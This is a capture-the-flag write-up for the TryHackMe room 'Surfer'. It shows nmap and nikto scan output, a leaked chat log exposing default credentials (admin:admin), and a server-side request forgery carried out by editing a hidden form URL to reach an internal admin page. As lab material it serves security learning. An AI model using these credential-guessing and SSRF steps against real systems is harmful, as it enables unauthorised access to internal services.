# Surfer

### Surfer

Room link: https://tryhackme.com/room/surfer

### Scanning

Just to ensure that I wasn't missing anything. I ran an aggressive NMAP scan.

```
ajread@aj-ubuntu:~/TryHackMe$ nmap -A [REMOTE IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-27 19:16 EDT
Nmap scan report for [REMOTE IP]
Host is up (0.073s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-robots.txt: 1 disallowed entry 
|_/backup/chat.txt
|_http-server-header: Apache/2.4.38 (Debian)
| http-title: 24X7 System+
|_Requested resource was /login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.39 seconds
```

I ran nikto as well to see what possible web app vulnerabilities there were.

```
ajread@aj-ubuntu:~/TryHackMe$ nikto -h [REMOTE IP]
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          [REMOTE IP]
+ Target Hostname:    [REMOTE IP]
+ Target Port:        80
+ Start Time:         2022-10-27 19:16:35 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ Cookie PHPSESSID created without the httponly flag
+ Retrieved x-powered-by header: PHP/7.2.34
+ The anti-clickjacking X-Frame-Options header is not present.
+ Root page / redirects to: /login.php
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x28 0x5d9416f2ee840 
+ File/dir '/backup/chat.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 6544 items checked: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2022-10-27 19:28:10 (GMT-4) (695 seconds)
---------------------------------------------------------------------------
```

As seen, there was a robots.txt entry. I investigated the entry and found and interesting chat log.

```
ajread@aj-ubuntu:~/TryHackMe$ curl http://[REMOTE IP]/backup/chat.txt

Admin: I have finished setting up the new export2pdf tool.
Kate: Thanks, we will require daily system reports in pdf format.
Admin: Yes, I am updated about that.
Kate: Have you finished adding the internal server.
Admin: Yes, it should be serving flag from now.
Kate: Also Don't forget to change the creds, plz stop using your username as password.
Kate: Hello.. ?
```

Therefore, I was able to log into the application with credentials `admin:admin`. On the right hand side within Recent Activity, the application stated that the flag was located within `/internal/admin.php`.The chat above talked about the export2pdf tool that was new as well. I needed to conduct SSRF to access the internal page. I decided to check out how the export2pdf interacts with the webpage. It appeared to submit a POST request to an internal info page.

```
            <!-- Reports -->
            <div class="col-12">
              <div class="card">

                <div class="card-body">
                  <h5 class="card-title">Export Reports <span>/Today</span></h5>
                  <form class="row g-3 needs-validation" novalidate action="export2pdf.php" method="POST">
                    <input type="hidden" id="url" name="url" value="http://127.0.0.1/server-info.php">
                    <div class="col-12">
                        <button class="btn btn-primary w-100" type="submit">Export to PDF</button>
                    </div>
                  </form>
                </div>

              </div>
            </div><!-- End Reports -->
```

I changed the value of the webpage to be the `/internal/admin.php` page and resent the request by clicking the Export to PDF button.

```
            <!-- Reports -->
            <div class="col-12">
              <div class="card">

                <div class="card-body">
                  <h5 class="card-title">Export Reports <span>/Today</span></h5>
                  <form class="row g-3 needs-validation" novalidate action="export2pdf.php" method="POST">
                    <input type="hidden" id="url" name="url" value="http://127.0.0.1/internal/admin.php">
                    <div class="col-12">
                        <button class="btn btn-primary w-100" type="submit">Export to PDF</button>
                    </div>
                  </form>
                </div>

              </div>
            </div><!-- End Reports -->
```

Finally, I found the flag!
